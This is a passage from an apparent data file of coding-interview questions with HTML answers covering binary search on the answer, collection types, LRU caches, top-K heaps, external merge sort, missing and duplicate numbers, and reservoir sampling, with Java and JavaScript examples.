<p><strong>Analogy:</strong> "What's the minimum speed to deliver all packages within 8 hours?" Speed could be 1-1000. Instead of trying each, binary search: "Is speed 500 enough? Yes → try 250. No → try 750."</p>
<p><strong>Example: Koko Eating Bananas</strong></p>
<pre>Problem: Koko has piles of bananas [3, 6, 7, 11]. 
Guard returns in 8 hours. Find minimum eating speed.

At speed k: time = ceil(3/k) + ceil(6/k) + ceil(7/k) + ceil(11/k)

Binary search on k (answer range: 1 to max(piles) = 11):
  mid=6: time = 1+1+2+2 = 6 ≤ 8 ✅ → try smaller → right=6
  mid=3: time = 1+2+3+4 = 10 > 8 ❌ → try bigger → left=4
  mid=5: time = 1+2+2+3 = 8 ≤ 8 ✅ → try smaller → right=5
  mid=4: time = 1+2+2+3 = 8 ≤ 8 ✅ → try smaller → right=4
  left=4, right=4 → Answer: 4 🍌/hour</pre>
<pre>// Java: Binary Search on Answer
int minEatingSpeed(int[] piles, int h) {
    int left = 1, right = Arrays.stream(piles).max().getAsInt();
    while (left < right) {
        int mid = (left + right) / 2;
        if (canFinish(piles, h, mid)) right = mid;
        else left = mid + 1;
    }
    return left;
}

boolean canFinish(int[] piles, int h, int speed) {
    int hours = 0;
    for (int pile : piles) hours += (pile + speed - 1) / speed;
    return hours <= h;
}</pre>
<p><strong>Pattern recognition:</strong> If the problem asks "find minimum/maximum X such that condition Y is satisfied" and the condition is <strong>monotonic</strong> (once true, stays true), use binary search on answer.</p>
<div class="key-point">This pattern appears in: splitting array, capacity to ship packages, magnetic force between balls, minimized maximum. Always ask: "Can I binary search the answer?"</div>`,
      },
      {
        q: 'What is the difference between a Set, Map, and List?',
        difficulty: 'easy',
        a: `<p>Three fundamental collection types in programming:</p>
<p><strong>Analogy:</strong></p>
<ul>
<li><strong>List</strong> = Shopping list: ordered, can have duplicates ("buy milk, eggs, milk").</li>
<li><strong>Set</strong> = Guest list at a party: no duplicates allowed ("John" appears only once).</li>
<li><strong>Map</strong> = Phone book: each name (key) maps to a phone number (value).</li>
</ul>
<pre>List:  [1, 2, 3, 2, 1]  → ordered, duplicates OK
Set:   {1, 2, 3}         → no duplicates, no guaranteed order
Map:   {"a":1, "b":2}    → key-value pairs, keys are unique</pre>
<table><tr><th>Feature</th><th>List (ArrayList)</th><th>Set (HashSet)</th><th>Map (HashMap)</th></tr>
<tr><td>Duplicates</td><td>Yes</td><td>No</td><td>Keys: No, Values: Yes</td></tr>
<tr><td>Order</td><td>Maintained</td><td>Not guaranteed*</td><td>Not guaranteed*</td></tr>
<tr><td>Access</td><td>By index O(1)</td><td>By value O(1)</td><td>By key O(1)</td></tr>
<tr><td>Use case</td><td>Ordered collection</td><td>Unique elements</td><td>Key→Value lookup</td></tr></table>
<pre>// Java examples:
List&lt;String&gt; list = new ArrayList&lt;&gt;();
list.add("apple"); list.add("apple"); // [apple, apple] ✅

Set&lt;String&gt; set = new HashSet&lt;&gt;();
set.add("apple"); set.add("apple"); // {apple} (only one!)

Map&lt;String, Integer&gt; map = new HashMap&lt;&gt;();
map.put("apple", 5); map.get("apple"); // 5</pre>
<div class="key-point">*Use <code>LinkedHashSet</code>/<code>LinkedHashMap</code> for insertion order, <code>TreeSet</code>/<code>TreeMap</code> for sorted order. In interviews, choose the right collection: need uniqueness? Set. Need key-value? Map. Need ordering? List.</div>`,
      },
      {
        q: 'Design an LRU Cache with O(1) get and put.',
        difficulty: 'tricky',
        a: `<p>THE classic senior coding question. An LRU (Least Recently Used) cache evicts the item that hasn't been touched for the longest time. The trick: <strong>no single structure gives O(1) for everything</strong>, so you combine two:</p>
<ul>
<li><strong>HashMap</strong>: key → node. O(1) lookup — but no notion of "order of use".</li>
<li><strong>Doubly-linked list</strong>: nodes ordered by recency (head = most recent, tail = LRU victim). O(1) move-to-front and remove — but O(n) lookup.</li>
</ul>
<p>Why <em>doubly</em> linked? To remove a node in O(1) you need its <code>prev</code> pointer. Why not an array/ArrayList for order? Moving an element to the front is O(n). Each structure covers the other's weakness.</p>
<pre>class LRUCache {
  constructor(capacity) {
    this.cap = capacity;
    this.map = new Map();           // key -> node
    this.head = {}; this.tail = {}; // sentinel nodes: no null checks
    this.head.next = this.tail;
    this.tail.prev = this.head;
  }
  _remove(n)  { n.prev.next = n.next; n.next.prev = n.prev; }
  _addFront(n){ n.next = this.head.next; n.prev = this.head;
                this.head.next.prev = n; this.head.next = n; }

  get(key) {
    const n = this.map.get(key);
    if (!n) return -1;
    this._remove(n); this._addFront(n);  // touch = move to front
    return n.value;
  }
  put(key, value) {
    if (this.map.has(key)) this._remove(this.map.get(key));
    const n = { key, value };
    this._addFront(n); this.map.set(key, n);
    if (this.map.size > this.cap) {
      const lru = this.tail.prev;        // real LRU node
      this._remove(lru);
      this.map.delete(lru.key);          // node stores key for this!
    }
  }
}</pre>
<pre>// Walkthrough, capacity 2:
put(1,A) → [1]        put(2,B) → [2,1]
get(1)   → A, [1,2]   // 1 touched, now most recent
put(3,C) → evict tail = 2 → [3,1]
get(2)   → -1         // gone</pre>
<p><strong>Java one-liner (mention it, then still code the real thing):</strong></p>
<pre>new LinkedHashMap&lt;K,V&gt;(16, 0.75f, true) {  // true = accessOrder!
  protected boolean removeEldestEntry(Map.Entry&lt;K,V&gt; e) {
    return size() > capacity;
  }
};</pre>
<p><strong>Follow-ups to expect:</strong> classic pitfalls (forgetting to store the key in the node — you can't delete from the map on eviction without it; forgetting that <code>get</code> also reorders); thread safety (lock striping, or segment the cache like old ConcurrentHashMap); LFU as the harder sequel; TTL expiry on top.</p>
<div class="key-point">LRU = HashMap for O(1) lookup + doubly-linked list for O(1) recency updates; each structure exists to fix the other's O(n) weakness, and the node must carry its key so eviction can clean the map.</div>`,
      },
      {
        q: 'How do you find the Top-K elements from a huge stream of data?',
        difficulty: 'hard',
        a: `<p>The naive answer — sort everything, take the first K — is O(n log n) and requires holding all n items. The senior answer: keep a <strong>min-heap of size K</strong>.</p>
<pre>// Top-K largest with a MIN-heap (yes, MIN — the counterintuitive part):
// The heap root is the SMALLEST of the current top K —
// i.e. the "weakest member of the club" = the cheapest to test against.
function topK(stream, k) {
  const heap = new MinHeap();
  for (const x of stream) {
    if (heap.size() < k) heap.push(x);
    else if (x > heap.peek()) {   // beats the weakest member?
      heap.pop();                 // kick it out
      heap.push(x);               // O(log k)
    }                             // else: ignore in O(1)
  }
  return heap.toArray();          // the top K
}

// Trace: k=3, stream = 5, 1, 9, 3, 7, 6
// [5] → [1,5] → [1,5,9] → 3>1? yes → [3,5,9]
// → 7>3? yes → [5,7,9] → 6>5? yes → [6,7,9]  ✓ top 3</pre>
<table><tr><th>Approach</th><th>Time</th><th>Space</th><th>Streaming?</th></tr>
<tr><td>Full sort</td><td>O(n log n)</td><td>O(n)</td><td>No — needs all data</td></tr>
<tr><td>Min-heap of size K</td><td>O(n log k)</td><td><strong>O(k)</strong></td><td><strong>Yes</strong></td></tr>
<tr><td>Quickselect</td><td>O(n) average</td><td>O(n), in-place</td><td>No — needs random access</td></tr></table>
<p><strong>Why O(n log k) matters:</strong> for n = 1 billion and k = 100, log k ≈ 7 vs log n ≈ 30 — and O(k) memory means the billion items never need to fit in RAM. That's what makes it work on a <em>stream</em>.</p>
<p><strong>When quickselect wins:</strong> the data already sits in an in-memory array, you only need this once, and you don't need the K results sorted — quickselect partitions around the K-th element in O(n) average. Its downsides: O(n²) worst case (mitigate with random pivots), destroys input order, useless for streams.</p>
<p><strong>Follow-ups to expect:</strong> "top K <em>frequent</em> elements" (hash map of counts first, then heap over the entries); "top K across many machines" (each node computes local top K, merge the K·m candidates); "K comparable to n" (just sort).</p>
<div class="key-point">Min-heap of size K: the root is the weakest of the current winners, so each new item needs one O(1) comparison and at most an O(log k) replace — O(n log k) time, O(k) space, and it works when the data can't fit in memory.</div>`,
      },
      {
        q: 'How do you sort a 100 GB file with only 1 GB of RAM?',
        difficulty: 'tricky',
        a: `<p>The systems-flavored sorting question — it checks whether you know that sorting doesn't stop working when data exceeds RAM. The answer is <strong>external merge sort</strong>, the same algorithm inside databases (ORDER BY spills), MapReduce shuffles, and Unix <code>sort</code>.</p>
<pre>// Phase 1: CHUNK → SORT → SPILL
// Read ~1 GB at a time, sort in memory, write sorted "run" to disk.
100 GB input
  → read chunk 1 (1 GB) → quicksort in RAM → write run_001 (sorted)
  → read chunk 2 (1 GB) → sort           → write run_002
  → ... → 100 sorted run files on disk

// Phase 2: K-WAY MERGE with a min-heap of size K (= 100)
// Open all runs; heap holds ONE current element per run.
heap = MinHeap of (value, runId)
push first element of each run                  // 100 entries
while heap not empty:
    (v, run) = heap.pop()        // global minimum across all runs
    output.write(v)              // buffered writes!
    if run has next: heap.push(next element of run)

// Memory in phase 2: 100 input buffers × ~10 MB + heap of 100
// entries + output buffer — comfortably under 1 GB.</pre>
<p><strong>Why a heap for the merge?</strong> Picking the minimum of K run-heads naively is O(K) per output element; the heap makes it O(log K). Total: O(n log K) merge after O(n log(chunk)) sorting — overall the classic O(n log n), just I/O-aware.</p>
<p><strong>What actually dominates: disk I/O, not CPU.</strong> Every element is read twice and written twice (once per phase) — so the design goal is minimizing <em>passes</em>:</p>
<ul>
<li>Use large sequential, buffered reads/writes per run — random 4 KB I/O would destroy throughput, especially on HDDs.</li>
<li>If runs outnumber what you can merge at once (too many open buffers), do <strong>multi-pass</strong> merging: merge 100 runs into 1 in groups, repeat. Passes = ceil(log_K(runs)).</li>
<li>Replacement selection (heap-based run generation) produces runs ~2× RAM size on average → fewer runs → fewer merge passes.</li>
</ul>
<p><strong>Follow-ups to expect:</strong> "what if it's 100 TB?" → shard across machines, external-sort locally, then distributed merge (this is essentially the MapReduce shuffle); "what if lines are variable-length records?" → same idea, count bytes not rows; "how does your database do ORDER BY without an index?" → exactly this, look for "external sort" in the query plan.</p>
<div class="key-point">External merge sort = sort RAM-sized chunks into sorted runs, then k-way merge them with a min-heap; the real engineering is minimizing disk passes with big sequential buffered I/O, because I/O — not comparisons — is the bottleneck.</div>`,
      },
      {
        q: 'Find the missing or duplicate number in an array of 1..n — compare the three classic solutions.',
        difficulty: 'tricky',
        a: `<p>Deceptively simple, but interviewers use it to see how many tools you have — and whether you know each one's failure mode. Setup: array of numbers from 1..n with one missing (or one duplicated).</p>
<pre>// Solution 1: Sum formula — O(n) time, O(1) space
// Expected sum of 1..n = n(n+1)/2
function findMissing(nums, n) {
  let expected = n * (n + 1) / 2;
  let actual = nums.reduce((a, b) => a + b, 0);
  return expected - actual;
}
// FAILURE MODE: overflow. n = 10^9 → sum ≈ 5×10^17, past 2^53
// (and past int32/int64 in other languages much sooner).
// JS numbers silently lose precision → wrong answer, no error.</pre>
<pre>// Solution 2: XOR trick — O(n) time, O(1) space, NO overflow
// x ^ x = 0,  x ^ 0 = x,  XOR is commutative.
// XOR all indices 1..n AND all values: pairs cancel,
// only the missing number survives.
function findMissing(nums, n) {
  let x = 0;
  for (let i = 1; i <= n; i++) x ^= i;
  for (const v of nums) x ^= v;
  return x;
}
// Why no overflow: XOR never carries — the result always fits
// in the same bit-width as the inputs. This is the "why XOR"
// answer interviewers fish for.</pre>
<pre>// Solution 3: Floyd's cycle detection — for the DUPLICATE variant
// (n+1 numbers in range 1..n, exactly one repeated;
//  constraint: no modifying the array, O(1) space)
// Treat value nums[i] as a pointer to index nums[i]:
// a duplicate value = two arrows into the same node = a cycle.
// The duplicate is the cycle's ENTRY point.
function findDuplicate(nums) {
  let slow = nums[0], fast = nums[0];
  do { slow = nums[slow]; fast = nums[nums[fast]]; }
  while (slow !== fast);        // phase 1: meet inside cycle
  slow = nums[0];
  while (slow !== fast) {       // phase 2: entry = duplicate
    slow = nums[slow]; fast = nums[fast];
  }
  return slow;
}
// Same algorithm as linked-list cycle detection — recognizing
// the array-as-implicit-linked-list mapping is the senior move.</pre>
<table><tr><th>Approach</th><th>Time</th><th>Space</th><th>Gotcha</th></tr>
<tr><td>Sum formula</td><td>O(n)</td><td>O(1)</td><td>Overflow on large n</td></tr>
<tr><td>XOR</td><td>O(n)</td><td>O(1)</td><td>None — carry-free</td></tr>
<tr><td>Floyd's</td><td>O(n)</td><td>O(1)</td><td>Only for duplicate; needs values as valid indices</td></tr></table>
<p><strong>Follow-ups to expect:</strong> "TWO numbers missing?" (XOR gives a^b; split all numbers into two groups by any set bit of a^b, XOR each group separately); "duplicates AND missing together?" (XOR pairs or index-marking by negation if mutation is allowed).</p>
<div class="key-point">Sum formula is the obvious answer with a silent overflow bug; XOR is carry-free so it can't overflow; and Floyd's works because an array of values-in-range IS an implicit linked list — the duplicate is the cycle entrance.</div>`,
      },
      {
        q: 'What is Reservoir Sampling? How do you pick a random item from a stream of unknown length?',
        difficulty: 'tricky',
        a: `<p>Problem: items arrive one at a time; you don't know how many will come and can't store them all. When the stream ends, you must hold ONE item chosen <strong>uniformly at random</strong> — every item with probability exactly 1/n — using O(1) space.</p>
<pre>// Reservoir sampling (k = 1):
function sample(stream) {
  let chosen = null, i = 0;
  for (const item of stream) {
    i++;
    if (Math.floor(Math.random() * i) === 0) {  // probability 1/i
      chosen = item;    // replace with prob 1/i
    }
  }
  return chosen;
}
// item 1: kept with prob 1/1 (always, it's all we have)
// item 2: replaces with prob 1/2
// item 3: replaces with prob 1/3 ... item i: prob 1/i</pre>
<p><strong>The proof (this IS the interview):</strong> why does "replace with probability 1/i" make every item end up with probability 1/n? Item j survives if it's chosen at step j AND never replaced afterwards:</p>
<pre>P(item j survives)
  = P(chosen at step j) × P(not replaced at j+1) × ... × P(not replaced at n)
  = (1/j) × (j/(j+1)) × ((j+1)/(j+2)) × ... × ((n-1)/n)
        ↑ telescoping: every numerator cancels the previous denominator
  = 1/n            — same for EVERY j. Uniform. ∎

// Sanity check, n = 3:
// item 1: 1 × 1/2 × 2/3 = 1/3
// item 2: 1/2 × 2/3     = 1/3
// item 3: 1/3           = 1/3   ✓</pre>
<p><strong>General k (Algorithm R):</strong> keep the first k items; for item i &gt; k, pick a random index r in [0, i); if r &lt; k, evict <code>reservoir[r]</code>. Each item ends with probability k/n, in O(k) space.</p>
<pre>function reservoirK(stream, k) {
  const res = []; let i = 0;
  for (const item of stream) {
    i++;
    if (res.length < k) res.push(item);
    else {
      const r = Math.floor(Math.random() * i);   // 0..i-1
      if (r < k) res[r] = item;                  // prob k/i
    }
  }
  return res;
}</pre>
<p><strong>Where it shows up in real systems:</strong> log/trace sampling ("keep 1000 random requests from today"), online ML training-set selection, picking a random row from a huge table scan — anywhere n is unknown or too big to hold.</p>
<p><strong>Follow-ups to expect:</strong> weighted reservoir sampling (Efraimidis–Spirakis: keep the k items with largest random^(1/weight) keys); distributed streams (sample per shard, then merge with counts); and the classic "prove it" — practice writing the telescoping product on a whiteboard.</p>
<div class="key-point">Replace the held item with probability 1/i and the survival probabilities telescope to exactly 1/n for every item — uniform sampling from an unknown-length stream in O(1) space; be ready to write that two-line proof.</div>`,
      },
    ],
  },
];
